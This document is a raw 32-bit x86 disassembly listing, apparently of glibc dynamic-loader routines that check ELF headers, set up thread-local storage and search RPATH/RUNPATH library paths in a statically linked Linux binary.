mov ebx, dword [0x80aac74]
mov edx, dword [edi + 0x1c]
mov ecx, ebx
mov dword [var_b4h], ebx
dec ecx
test ecx, edx
jne 0x807c535
mov eax, dword [edi + 8]
dec edx
mov dword [var_b8h], eax
sub eax, dword [edi + 4]
test edx, eax
jne 0x807c52b
mov ebx, dword [var_c0h]
not edx
not ecx
inc dword [var_ach]
lea eax, [ebx + 0x18]
mov dword [var_c0h], eax
mov eax, dword [var_b8h]
and edx, eax
mov eax, dword [var_c0h]
mov dword [var_c4h], edx
mov dword [eax - 0x18], edx
mov edx, dword [var_b4h]
mov eax, dword [edi + 0x10]
add eax, dword [edi + 8]
lea eax, [edx + eax - 1]
and eax, ecx
mov ecx, dword [var_c0h]
mov dword [ecx - 0x14], eax
mov eax, dword [edi + 0x10]
add eax, dword [edi + 8]
mov dword [ecx - 0x10], eax
mov eax, dword [edi + 0x14]
add eax, dword [edi + 8]
mov dword [ecx - 0xc], eax
mov eax, dword [edi + 0x1c]
dec eax
not eax
and eax, dword [edi + 4]
cmp dword [var_ach], 1
mov dword [ecx - 8], eax
jbe 0x807c510
mov eax, dword [var_c4h]
cmp dword [ebx - 0x14], eax
je 0x807c510
mov byte [var_adh], 1
mov ecx, dword [edi + 0x18]
mov eax, 0x73516240
and ecx, 7
shl ecx, 2
sar eax, cl
and eax, 0xf
mov dword [ebx + 0x14], eax
jmp 0x807bbd3
mov ebx, str.ELF_load_command_address_offset_not_properly_aligned
jmp 0x807c430
mov ebx, str.ELF_load_command_alignment_not_page_aligned
jmp 0x807c430
nop
cmp eax, 0x6474e551
je 0x807c737
ja 0x807c712
cmp eax, 7
jne 0x807bbd3
mov eax, dword [edi + 0x14]
test eax, eax
je 0x807bbd3
mov edx, dword [var_80h_2]
mov dword [edx + 0x218], eax
mov eax, dword [edi + 0x1c]
mov dword [edx + 0x21c], eax
mov eax, dword [edi + 0x1c]
test eax, eax
jne 0x807c700
mov dword [edx + 0x220], 0
mov ebx, dword [var_80h_2]
mov eax, dword [edi + 0x10]
mov dword [ebx + 0x214], eax
mov eax, dword [edi + 8]
mov dword [ebx + 0x210], eax
movzx eax, byte [ebx + 0x174]
and eax, 3
dec al
jne 0x807c5c9
call fcn.08082e40
mov esi, dword [var_80h_2]
mov dword [esi + 0x228], eax
movzx esi, word [esi + 0x14c]
jmp 0x807bbd3
mov eax, dword [0x80aabdc]
test eax, eax
jne 0x807c5af
call fcn.080489d0
test eax, eax
jne 0x807c6e6
xor eax, eax
call fcn.080831f0
test eax, eax
mov dword [var_c8h], eax
je 0x807c6e6
mov edx, dword [var_c8h]
mov eax, dword [0x80a95d0]
lea esi, [var_7ch]
mov ebx, esi
mov dword [edx + 0x10], eax
mov dword [edx], edx
mov dword [edx + 8], edx
movzx eax, byte [var_70h]
mov dword [var_7ch], 0xffffffff
mov dword [var_78h], edx
mov dword [var_74h], 0xfffff
and eax, 0xffffffd1
or eax, 0x51
mov byte [var_70h], al
mov eax, 0xf3
and dword [var_70h], 0x7f
int 0x80
test eax, eax
jne 0x807c68c
mov eax, dword [var_7ch]
lea eax, [eax*8 + 3]
mov gs, eax
xor eax, eax
test eax, eax
mov ebx, eax
jne 0x807c66d
mov ebx, dword [var_80h_2]
mov eax, dword [0x80aabd8]
movzx esi, word [ebx + 0x14c]
inc eax
mov dword [0x80aabd8], eax
mov dword [ebx + 0x228], eax
jmp 0x807bbd3
mov eax, dword [var_c8h]
mov edx, 1
mov dword [var_94h_2], 0
call fcn.08083210
jmp 0x807c430
cmp dword [0x80aac6c], 0x20362
jbe 0x807c6dc
movzx eax, byte [var_70h]
mov dword [var_7ch], 0
mov ebx, 1
mov edx, 0x10
mov ecx, esi
and eax, 0xffffffd1
or eax, 0x51
mov byte [var_70h], al
mov eax, 0x7b
and dword [var_70h], 0x7f
int 0x80
test eax, eax
mov edx, str.cannot_set_up_LDT_for_thread_local_storage_n
jne 0x807c6d5
mov eax, 7
mov gs, eax
xor edx, edx
mov eax, edx
jmp 0x807c647
mov eax, str.kernel_too_old_for_thread_local_storage_support_n
jmp 0x807c647
mov ebx, str.cannot_allocate_TLS_data_structures_for_initial_thread
mov dword [var_94h_2], 0xc
jmp 0x807c430
lea esi, [esi]
dec eax
mov ecx, dword [var_80h_2]
and eax, dword [edi + 8]
mov dword [ecx + 0x220], eax
jmp 0x807c58c
cmp eax, 0x6474e552
jne 0x807bbd3
mov eax, dword [edi + 8]
mov edx, dword [var_80h_2]
mov dword [edx + 0x22c], eax
mov eax, dword [edi + 0x14]
mov dword [edx + 0x230], eax
jmp 0x807bbd3
mov eax, dword [edi + 0x18]
mov dword [var_a0h_2], eax
jmp 0x807bbd3
mov eax, dword [edi + 8]
mov ecx, dword [var_80h_2]
mov dword [ecx + 0x144], eax
jmp 0x807bbd3
mov eax, dword [var_8ch]
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
lea ebx, [var_43h]
and ebx, 0xfffffff0
mov dword [var_88h], ebx
mov dword [var_4h_3], 0
mov esi, dword [var_84h]
mov eax, dword [esi + 0x1c]
mov dword [var_4h_4], eax
mov eax, dword [var_8h_2]
mov dword [esp], eax
call fcn.08090150
mov edx, dword [var_8ch]
mov dword [var_4h_4], ebx
mov ebx, str.cannot_read_file_data
mov dword [var_4h_3], edx
mov ecx, dword [var_8h_2]
mov dword [esp], ecx
call fcn.08053f70
cmp eax, dword [var_8ch]
jne 0x807bdc3
jmp 0x807bb4d
mov edx, dword [var_4h_2]
mov dword [esp], str.file_s___generating_link_map_n
mov dword [var_4h_3], edx
call fcn.08081c40
jmp 0x807bacb
mov ebx, dword [var_8h_3]
mov dword [esp], ebx
call fcn.08053f20
mov esi, dword [var_sp_10h]
mov dword [esp], esi
call fcn.08051180
mov edx, dword [var_4h_3]
mov eax, dword [var_80h_2]
jmp 0x807c069
mov ebx, str.cannot_stat_shared_object
jmp 0x807bdc3
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x18
mov dword [var_14h], 1
mov eax, dword [0x80aa9f0]
add eax, dword [0x80aa9fc]
mov edi, dword [arg_8h]
mov dword [var_10h], esp
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
mov dword [esp], str._search_path
lea esi, [var_1bh]
call fcn.08081c40
mov eax, dword [edi]
and esi, 0xfffffff0
test eax, eax
je 0x807c85a
mov edx, dword [var_ch]
cmp dword [eax + 4], edx
je 0x807c8ac
mov eax, dword [var_14h]
test eax, eax
je 0x807c897
mov eax, dword [var_14h]
cmp byte [eax], 0
jne 0x807c892
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
mov edx, dword [var_ch]
mov dword [esp], str._t_t__s_from_file__s__n
mov dword [var_4h], edx
call fcn.08081c70
mov esp, dword [var_10h_2]
lea esp, [var_ch_2]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_14h]
jmp 0x807c870
mov eax, dword [var_ch]
mov dword [esp], str._t_t__s__n
mov dword [var_4h], eax
call fcn.08081c70
jmp 0x807c887
mov eax, dword [eax + 0x10]
xor ebx, ebx
mov dword [var_8h], eax
mov eax, dword [edi]
mov eax, dword [eax + 0xc]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08053740
mov edx, dword [0x80aa9ec]
mov dword [var_18h], eax
cmp ebx, edx
jae 0x807c941
mov eax, dword [edi]
cmp dword [eax + ebx*4 + 0x14], 1
je 0x807c93c
mov eax, dword [0x80aa9e8]
mov eax, dword [eax + ebx*8 + 4]
mov dword [var_8h], eax
mov eax, dword [0x80aa9e8]
mov eax, dword [eax + ebx*8]
mov dword [var_4h], eax
mov eax, dword [var_18h]
mov dword [esp], eax
call fcn.08053740
cmp eax, esi
mov edx, eax
je 0x807c964
lea eax, [esi + 1]
cmp edx, eax
je 0x807c95f
mov byte [edx - 1], 0
mov dword [var_4h], esi
mov eax, 0x80a37bd
mov edx, 0x80a37be
mov ecx, dword [var_14h_2]
test ecx, ecx
cmove edx, eax
mov dword [esp], edx
call fcn.08081c70
mov dword [var_14h_2], 0
mov edx, dword [0x80aa9ec]
inc ebx
cmp ebx, edx
jb 0x807c8d3
add edi, 4
mov eax, dword [edi]
test eax, eax
je 0x807c85a
mov edx, dword [var_ch]
cmp dword [eax + 4], edx
je 0x807c8ac
jmp 0x807c85a
cmp byte [esi], 0x2f
jne 0x807c90d
mov byte [edx], 0
jmp 0x807c911
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x4c
mov eax, dword [arg_8h]
mov dword [var_34h], 0
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.08053ec0
mov dword [var_30h], eax
inc eax
je 0x807ca75
call fcn.08048b20
mov ecx, dword [var_30h]
mov edx, dword [arg_ch]
mov dword [eax], 0
mov ebx, eax
mov dword [var_8h], 0x200
add edx, 4
mov dword [esp], ecx
mov dword [var_38h], edx
mov dword [var_4h], edx
call fcn.08053f70
mov esi, dword [arg_ch]
cmp eax, 0x33
mov dword [esi], eax
jle 0x807cc80
mov esi, dword [var_38h]
mov edi, 0x80a35ff
mov ecx, 9
cld
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807cc0b
mov esi, dword [var_38h]
cmp dword [esi + 0x14], 1
jne 0x807cc01
mov edi, dword [var_38h]
cmp word [edi + 0x12], 3
jne 0x807caf0
movzx eax, word [edi + 0x10]
cmp eax, 3
jne 0x807cbee
mov eax, dword [var_38h]
cmp word [eax + 0x2a], 0x20
jne 0x807cbe4
mov edx, dword [var_38h]
mov edi, dword [arg_ch]
movzx ecx, word [edx + 0x2c]
mov edx, dword [edx + 0x1c]
movzx ebx, cx
shl ebx, 5
lea eax, [ebx + edx]
cmp eax, dword [edi]
ja 0x807cb8f
lea edx, [edx + edi + 4]
mov dword [var_3ch], edx
mov ebx, dword [var_3ch]
movzx eax, cx
shl eax, 5
lea eax, [eax + ebx]
cmp ebx, eax
jae 0x807ca75
lea esi, [esi]
cmp dword [ebx], 4
je 0x807ca80
movzx eax, cx
add ebx, 0x20
shl eax, 5
add eax, dword [var_3ch]
cmp ebx, eax
jb 0x807ca60
mov eax, dword [var_30h]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
cmp dword [ebx + 0x10], 0x20
jne 0x807ca65
cmp dword [ebx + 0x1c], 3
jbe 0x807ca65
mov edx, dword [ebx + 4]
mov ecx, dword [arg_ch]
lea eax, [edx + 0x20]
cmp eax, dword [ecx]
ja 0x807cb12
lea edx, [edx + ecx + 4]
mov dword [var_40h], edx
mov esi, dword [var_40h]
mov edx, 0x80a3608
mov eax, 0x10
cld
mov edi, edx
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x807cabf
mov edi, dword [var_38h]
movzx ecx, word [edi + 0x2c]
jmp 0x807ca65
mov edx, dword [var_40h]
mov ecx, dword [var_40h]
movzx eax, byte [edx + 0x14]
mov ebx, dword [ecx + 0x10]
movzx edx, byte [edx + 0x18]
shl eax, 8
add eax, edx
movzx edx, byte [ecx + 0x1c]
shl eax, 8
add eax, edx
test ebx, ebx
jne 0x807caf0
mov edx, dword [0x80aac6c]
test edx, edx
je 0x807ca75
cmp edx, eax
jae 0x807ca75
mov esi, dword [var_30h]
mov dword [esp], esi
call fcn.08053f20
call fcn.08048b20
mov dword [eax], 2
mov dword [var_30h], 0xffffffff
jmp 0x807ca75
mov esi, dword [var_30h]
mov dword [var_8h], 0
mov eax, dword [ebx + 4]
mov dword [esp], esi
mov dword [var_4h], eax
lea esi, [var_2ch]
call fcn.08090150
mov edi, dword [var_30h]
mov dword [var_4h], esi
mov dword [var_8h], 0x20
mov dword [esp], edi
call fcn.08053f70
cmp eax, 0x20
jne 0x807cb53
mov dword [var_40h], esi
jmp 0x807caa0
call fcn.08048b20
mov edx, str.cannot_read_file_data
mov eax, dword [eax]
mov dword [var_34h], eax
mov dword [var_14h], edx
mov edi, dword [arg_8h]
mov eax, dword [var_30h]
mov edx, dword [var_34h]
mov dword [var_10h], 0
mov dword [var_sp_ch], 0
mov dword [var_8h], edi
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.0807b960
lea eax, [ebx + 0x12]
and eax, 0x3ffffc
sub esp, eax
mov dword [var_4h], edx
lea eax, [var_27h]
mov dword [var_8h], 0
mov edx, dword [var_30h]
and eax, 0xfffffff0
mov dword [var_3ch], eax
mov dword [esp], edx
call fcn.08090150
mov esi, dword [var_30h]
mov ecx, dword [var_3ch]
mov dword [var_8h], ebx
mov dword [esp], esi
mov dword [var_4h], ecx
call fcn.08053f70
cmp eax, ebx
jne 0x807cb53
mov edi, dword [var_38h]
movzx ecx, word [edi + 0x2c]
jmp 0x807ca49
mov edx, str.ELF_files_phentsize_not_the_expected_size
jmp 0x807cb62
cmp eax, 2
mov edx, str.only_ET_DYN_and_ET_EXEC_can_be_loaded
je 0x807ca16
jmp 0x807cb62
mov edx, str.ELF_file_version_does_not_match_current_one
jmp 0x807cb62
mov ecx, dword [arg_ch]
cmp dword [ecx + 4], 0x464c457f
je 0x807cc21
mov edx, str.invalid_ELF_header
jmp 0x807cb62
mov esi, dword [var_38h]
cmp byte [esi + 4], 1
jne 0x807caf0
cmp byte [esi + 5], 1
je 0x807cc3e
mov edx, str.ELF_file_data_encoding_not_little_endian
jmp 0x807cb62
mov edi, dword [var_38h]
cmp byte [edi + 6], 1
je 0x807cc51
mov edx, str.ELF_file_version_ident_does_not_match_current_one
jmp 0x807cb62
mov eax, dword [var_38h]
cmp byte [eax + 7], 0
je 0x807cc64
mov edx, str.ELF_file_OS_ABI_invalid
jmp 0x807cb62
mov ecx, dword [var_38h]
mov edx, str.ELF_file_ABI_version_invalid
mov eax, str.internal_error
cmp byte [ecx + 8], 0
cmove edx, eax
jmp 0x807cb62
lea esi, [esi]
mov ebx, dword [ebx]
mov edx, str.file_too_short
mov eax, str.cannot_read_file_data
test ebx, ebx
mov dword [var_34h], ebx
cmovne edx, eax
jmp 0x807cb62
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x88
mov edx, dword [arg_ch]
mov dword [var_7ch], 0
mov eax, dword [arg_14h]
mov dword [var_74h], 0xffffffff
mov dword [var_78h], 0
mov eax, dword [eax]
mov dword [var_70h], eax
mov eax, dword [0x80aa9f0]
add eax, dword [0x80aa9fc]
lea eax, [edx + eax + 0x12]
and eax, 0xfffffffc
sub esp, eax
mov eax, dword [var_70h]
lea edi, [var_1bh]
and edi, 0xfffffff0
mov esi, dword [eax]
lea esi, [esi]
test byte [0x80aac10], 1
mov dword [var_80h], 0
mov dword [var_88h], 0
jne 0x807cf71
mov eax, dword [esi + 0x10]
xor ebx, ebx
mov dword [var_8h], eax
mov eax, dword [esi + 0xc]
mov dword [esp], edi
mov dword [var_4h], eax
call fcn.08053740
cmp dword [var_74h], 0xffffffff
mov dword [var_84h], eax
jne 0x807cdd7
cmp ebx, dword [0x80aa9ec]
jae 0x807cd5e
mov esi, esi
cmp dword [esi + ebx*4 + 0x14], 1
jne 0x807ce12
inc ebx
cmp dword [var_74h], 0xffffffff
jne 0x807cdd7
cmp ebx, dword [0x80aa9ec]
jb 0x807cd40
cmp dword [var_74h], 0xffffffff
jne 0x807cdd7
mov eax, dword [var_88h]
test eax, eax
je 0x807cd84
call fcn.08048b20
mov eax, dword [eax]
cmp eax, 2
je 0x807cd84
cmp eax, 0xd
mov edx, 0xffffffff
jne 0x807cdac
add dword [var_70h], 4
mov eax, dword [var_88h]
mov edx, dword [var_70h]
or dword [var_7ch], eax
mov eax, dword [edx]
test eax, eax
mov esi, eax
jne 0x807ccf0
mov edi, dword [var_7ch]
test edi, edi
je 0x807cdb6
mov edx, 0xffffffff
lea esp, [var_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_14h]
mov esi, dword [eax + 4]
test esi, esi
jne 0x807cdcb
mov eax, dword [arg_14h]
mov dword [eax], 0xffffffff
jmp 0x807cda7
mov eax, dword [eax]
mov dword [esp], eax
call fcn.08051180
jmp 0x807cdc0
mov edx, dword [var_80h]
mov dword [esp], edx
call fcn.08050fe0
mov edx, eax
mov eax, dword [arg_18h]
test edx, edx
mov dword [eax], edx
je 0x807ce05
mov eax, dword [var_80h]
mov dword [esp], edx
mov dword [var_4h], edi
mov dword [var_8h], eax
call fcn.08053770
mov edx, dword [var_74h]
jmp 0x807cdac
mov edx, dword [var_74h]
mov dword [esp], edx
call fcn.08053f20
jmp 0x807cda7
mov edx, dword [0x80aa9e8]
mov eax, dword [edx + ebx*8 + 4]
mov dword [var_8h], eax
mov eax, dword [edx + ebx*8]
mov edx, dword [var_84h]
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.08053740
mov edx, dword [arg_ch]
mov dword [esp], eax
mov dword [var_8h], edx
mov edx, dword [arg_8h]
mov dword [var_4h], edx
call fcn.08053740
mov dword [var_80h], eax
sub dword [var_80h], edi
test byte [0x80aac10], 1
jne 0x807cf5c
mov eax, dword [arg_1ch]
mov dword [esp], edi
mov dword [var_4h], eax
call fcn.0807c970
mov edx, dword [esi + ebx*4 + 0x14]
mov dword [var_74h], eax
test edx, edx
jne 0x807ce8c
inc eax
je 0x807cf11
mov dword [esi + ebx*4 + 0x14], 2
mov edx, 2
mov eax, dword [var_88h]
or eax, 1
cmp edx, 2
cmovne eax, dword [var_88h]
cmp dword [var_74h], 0xffffffff
mov dword [var_88h], eax
je 0x807cd4b
mov eax, dword [arg_10h]
test eax, eax
je 0x807cd4b
mov eax, dword [0x80a95f4]
test eax, eax
je 0x807cd4b
mov edx, dword [var_74h]
lea eax, [var_6ch]
mov dword [esp], 3
mov dword [var_8h], eax
mov dword [var_4h], edx
call fcn.08053dc0
test eax, eax
jne 0x807ceef
test byte [var_5bh], 8
jne 0x807cd4b
mov eax, dword [var_74h]
mov dword [esp], eax
call fcn.08053f20
mov dword [var_74h], 0xffffffff
call fcn.08048b20
mov dword [eax], 2
jmp 0x807cd4b
mov eax, dword [var_80h]
lea edx, [var_6ch]
sub eax, dword [arg_ch]
mov byte [eax + edi - 1], 0
mov dword [esp], 3
mov dword [var_4h], edi
mov dword [var_8h], edx
call fcn.08079600
test eax, eax
jne 0x807cf4a
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x4000
je 0x807ce7f
mov edx, 1
mov dword [esi + ebx*4 + 0x14], 1
jmp 0x807ce8c
mov dword [var_4h], edi
mov dword [esp], str.__trying_file_s_n
call fcn.08081c40
jmp 0x807ce5e
mov eax, dword [esi + 4]
cmp dword [var_78h], eax
je 0x807cd0e
mov dword [var_78h], eax
mov edx, dword [var_78h]
mov eax, dword [esi + 8]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov eax, dword [var_70h]
mov dword [esp], eax
call fcn.0807c810
jmp 0x807cd0e
mov esi, esi
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, edx
sub esp, 0x258
mov esi, dword [0x80aac58]
mov dword [var_22ch], ecx
mov dword [var_228h], eax
test esi, esi
je 0x807cff2
test byte [esi + 0x175], 2
jne 0x807cfeb
mov edx, esi
mov eax, ebx
call fcn.08081cd0
test eax, eax
jne 0x807d0c6
test byte [esi + 0x175], 1
je 0x807d62c
mov esi, dword [esi + 0xc]
test esi, esi
jne 0x807cfc4
test byte [0x80aac10], 0x40
jne 0x807d5f0
mov dword [var_4h], 0x2f
mov dword [esp], ebx
call fcn.08076ce0
test eax, eax
je 0x807d1bc
mov eax, dword [var_228h]
test eax, eax
je 0x807d18a
mov edx, dword [var_228h]
mov dword [var_4h], ebx
mov dword [esp], edx
call fcn.0807b0c0
test eax, eax
mov dword [var_220h], eax
jne 0x807d0fb
mov eax, dword [arg_ch]
test eax, eax
je 0x807d0e7
test byte [0x80aac11], 2
jne 0x807d0e7
mov dword [esp], ebx
call fcn.08053400
lea esi, [eax + 1]
mov dword [esp], esi
call fcn.08050fe0
test eax, eax
je 0x807d0d2
mov dword [var_8h], esi
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.08053770
test eax, eax
je 0x807d0d2
mov edx, dword [var_228h]
mov ecx, dword [arg_8h]
mov dword [esp], edx
mov edx, ebx
call fcn.0807ea00
sub esp, 4
mov esi, eax
test eax, eax
je 0x807d0d2
or byte [eax + 0x175], 2
mov dword [eax + 0x168], 0x80a3618
mov dword [eax + 0x164], 1
or byte [eax + 0x174], 4
mov eax, esi
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret 0xc
xor ecx, ecx
mov edx, ebx
mov eax, 0xc
mov dword [esp], str.cannot_create_shared_object_descriptor
call fcn.08081200
call fcn.08048b20
mov edx, ebx
xor ecx, ecx
mov dword [esp], str.cannot_open_shared_object_file
mov eax, dword [eax]
jmp 0x807d0e2
lea ecx, [var_21ch]
mov dword [esp], eax
mov dword [var_4h], ecx
call fcn.0807c970
mov dword [var_230h], eax
inc eax
je 0x807d16e
mov eax, dword [0x80aac00]
mov ecx, dword [arg_8h]
lea edx, [var_21ch]
mov dword [var_8h], edx
mov dword [esp], ebx
mov dword [var_224h], eax
mov dword [var_14h], ecx
lea eax, [var_224h]
mov dword [var_1ch], eax
mov ecx, dword [var_230h]
mov eax, dword [arg_10h]
mov dword [var_18h], eax
mov dword [var_4h], ecx
mov eax, dword [var_228h]
mov dword [var_10h], eax
mov eax, dword [var_220h]
mov dword [var_ch], eax
call fcn.0807ba00
jmp 0x807d0c8
mov eax, dword [var_220h]
mov dword [esp], eax
call fcn.08051180
cmp dword [var_230h], 0xffffffff
jne 0x807d116
jmp 0x807d045
mov dword [esp], ebx
call fcn.08053400
lea esi, [eax + 1]
mov dword [esp], esi
call fcn.08050fe0
xor edx, edx
test eax, eax
je 0x807d1b5
mov dword [var_8h], esi
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.08053770
mov edx, eax
mov eax, edx
jmp 0x807d037
mov dword [esp], ebx
call fcn.08053400
inc eax
test byte [0x80aac10], 1
mov dword [var_234h], eax
jne 0x807d5db
mov eax, dword [var_228h]
mov dword [var_230h], 0xffffffff
test eax, eax
je 0x807d200
mov ecx, dword [var_228h]
mov eax, dword [ecx + 0x8c]
test eax, eax
jne 0x807d2e4
mov esi, dword [var_228h]
test esi, esi
je 0x807d247
lea edi, [esi + 0x180]
mov dword [var_ch], str.RPATH
mov dword [var_8h], 0xf
mov dword [var_4h], edi
mov dword [esp], esi
call fcn.0807b6a0
test al, al
jne 0x807d59c
cmp dword [var_230h], 0xffffffff
mov esi, dword [esi + 0x160]
jne 0x807d247
test esi, esi
jne 0x807d20a
cmp dword [var_230h], 0xffffffff
mov esi, dword [0x80aac58]
je 0x807d274
test byte [0x80aac10], 1
je 0x807d17c
mov dword [esp], 0x809302e
call fcn.08081c40
jmp 0x807d17c
test esi, esi
je 0x807d2d7
movzx eax, byte [esi + 0x174]
and eax, 3
cmp al, 2
je 0x807d2d7
cmp esi, dword [var_228h]
je 0x807d2d7
cmp dword [esi + 0x180], 0xffffffff
je 0x807d2d7
lea eax, [var_220h]
mov ecx, dword [var_22ch]
lea edx, [var_21ch]
mov dword [var_10h], eax
mov dword [var_14h], edx
mov dword [esp], ebx
lea eax, [esi + 0x180]
mov dword [var_ch], eax
mov dword [var_8h], ecx
mov eax, dword [var_234h]
mov dword [var_4h], eax
call fcn.0807cca0
mov dword [var_230h], eax
cmp dword [var_230h], 0xffffffff
jne 0x807d256
cmp dword [0x80aa9e0], 0xffffffff
je 0x807d32b
lea eax, [var_220h]
mov ecx, dword [var_22ch]
lea edx, [var_21ch]
mov dword [var_10h], eax
mov dword [var_14h], edx
mov dword [var_ch], 0x80aa9e0
mov eax, dword [var_234h]
mov dword [esp], ebx
mov dword [var_8h], ecx
mov dword [var_4h], eax
call fcn.0807cca0
mov dword [var_230h], eax
cmp dword [var_230h], 0xffffffff
jne 0x807d256
mov eax, dword [var_228h]
test eax, eax
je 0x807d378
mov esi, dword [var_228h]
mov edx, dword [var_228h]
mov dword [var_ch], str.RUNPATH
mov dword [var_8h], 0x1d
add esi, 0x1d0
mov dword [esp], edx
mov dword [var_4h], esi
call fcn.0807b6a0
test al, al
jne 0x807d55d
cmp dword [var_230h], 0xffffffff
jne 0x807d256
mov edi, dword [var_22ch]
test edi, edi
jne 0x807d54a
mov eax, ebx
call fcn.0807d980
test eax, eax
mov dword [var_238h], eax
je 0x807d435
mov ecx, dword [var_228h]
test ecx, ecx
je 0x807d3c5
mov ecx, dword [var_228h]
test byte [ecx + 0x1ed], 8
jne 0x807d4d5
mov edx, dword [var_238h]
test edx, edx
je 0x807d435
mov ecx, dword [var_238h]
lea edx, [var_21ch]
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0807c970
mov dword [var_230h], eax
inc eax
je 0x807d442
mov eax, dword [var_238h]
mov dword [esp], eax
call fcn.08053400
lea esi, [eax + 1]
mov dword [esp], esi
call fcn.08050fe0
mov edx, eax
xor eax, eax
test edx, edx
je 0x807d427
mov ecx, dword [var_238h]
mov dword [var_8h], esi
mov dword [esp], edx
mov dword [var_4h], ecx
call fcn.08053770
test eax, eax
mov dword [var_220h], eax
je 0x807d4b8
cmp dword [var_230h], 0xffffffff
jne 0x807d256
mov eax, dword [var_228h]
mov esi, dword [var_228h]
test eax, eax
cmove esi, dword [0x80aac58]
test esi, esi
je 0x807d468
test byte [esi + 0x1ed], 8
jne 0x807d256
cmp dword [0x80aa9f4], 0xffffffff
je 0x807d256
lea eax, [var_220h]
mov ecx, dword [var_22ch]
lea edx, [var_21ch]
mov dword [var_10h], eax
mov dword [var_14h], edx
mov dword [var_ch], 0x80aa9f4
mov eax, dword [var_234h]
mov dword [esp], ebx
mov dword [var_8h], ecx
mov dword [var_4h], eax
call fcn.0807cca0
mov dword [var_230h], eax
jmp 0x807d256
mov eax, dword [var_230h]
mov dword [esp], eax
call fcn.08053f20
mov dword [var_230h], 0xffffffff
jmp 0x807d435
mov dword [var_23ch], str._lib_
mov dword [var_240h], 0
cld
mov eax, dword [var_240h]
mov esi, dword [var_238h]
mov edi, dword [var_23ch]
mov eax, dword [eax*4 + 0x80a35f4]
mov dword [var_244h], eax
cmp eax, eax
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x807d53b
inc dword [var_240h]
mov eax, dword [var_23ch]
mov edx, dword [var_244h]
cmp dword [var_240h], 1
lea eax, [edx + eax + 1]
mov dword [var_23ch], eax
jbe 0x807d4ea
jmp 0x807d3c5
mov dword [var_238h], 0
jmp 0x807d3c5
mov esi, dword [0x80a95f4]
test esi, esi
jne 0x807d435
jmp 0x807d393
lea eax, [var_220h]
mov edx, dword [var_234h]
lea ecx, [var_21ch]
mov dword [var_10h], eax
mov dword [var_14h], ecx
mov dword [var_ch], esi
mov eax, dword [var_22ch]
mov dword [esp], ebx
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0807cca0
mov dword [var_230h], eax
jmp 0x807d378
lea eax, [var_21ch]
mov ecx, dword [var_22ch]
lea edx, [var_220h]
mov dword [var_14h], eax
mov dword [var_10h], edx
mov dword [var_ch], edi
mov eax, dword [var_234h]
mov dword [esp], ebx
mov dword [var_8h], ecx
mov dword [var_4h], eax
call fcn.0807cca0
mov dword [var_230h], eax
jmp 0x807d234
mov dword [var_4h], ebx
mov dword [esp], str.find_library_s__searching_n
call fcn.08081c40
jmp 0x807d1d8
mov eax, dword [var_228h]
test eax, eax
je 0x807cfff
mov edx, dword [var_228h]
mov eax, dword [edx + 4]
cmp byte [eax], 0
jne 0x807d613
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
mov dword [var_4h], ebx
mov dword [esp], str._nfile_s___needed_by__s_n
call fcn.08081c40
jmp 0x807cfff
mov edx, dword [esi + 0x50]
test edx, edx
je 0x807cfeb
mov eax, dword [esi + 0x2c]
mov edi, dword [edx + 4]
add edi, dword [eax + 4]
mov dword [esp], ebx
mov dword [var_4h], edi
call fcn.08076e50
test eax, eax
jne 0x807cfeb
mov edx, edi
mov eax, esi
call fcn.0807b200
or byte [esi + 0x175], 1
jmp 0x807d0c6
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
mov esi, ecx
push ebx
sub esp, 0x10
mov eax, dword [arg_8h]
mov dword [var_10h], ecx
mov eax, dword [eax]
cmp eax, 0xffffffff
je 0x807d6ac
mov edi, eax
mov ecx, dword [eax]
lea esi, [esi]
add edi, 4
cmp byte [esi - 9], 0
je 0x807d6b4
mov eax, dword [esi - 0x10]
inc dword [eax + 4]
mov edx, dword [ecx + 0x10]
add dword [eax], edx
mov eax, dword [edi]
test eax, eax
mov ecx, eax
jne 0x807d690
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [esi - 4]
mov edx, dword [esi - 0x10]
lea edx, [edx + eax*8]
inc eax
mov dword [esi - 4], eax
lea ebx, [edx + 8]
mov eax, dword [esi - 8]
mov dword [edx + 8], eax
mov eax, dword [ecx + 0x10]
dec eax
mov dword [var_8h], eax
mov eax, dword [ecx + 0xc]
mov dword [var_4h], eax
mov eax, dword [esi - 8]
mov dword [esp], eax
call fcn.08053740
mov dword [esi - 8], eax
mov byte [eax], 0
mov eax, dword [arg_ch]
inc dword [esi - 8]
mov dword [ebx + 4], eax
jmp 0x807d6a4
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0x20
test cl, cl
mov byte [var_15h], cl
mov dword [var_1ch], edx
je 0x807d722
mov dword [edx + 4], 0
mov dword [edx], 0
mov eax, dword [edx + 4]
mov dword [var_10h], 0
lea eax, [edx + eax*8 + 8]
mov dword [var_14h], eax
mov eax, dword [edi + 0x8c]
test eax, eax
jne 0x807d7c0
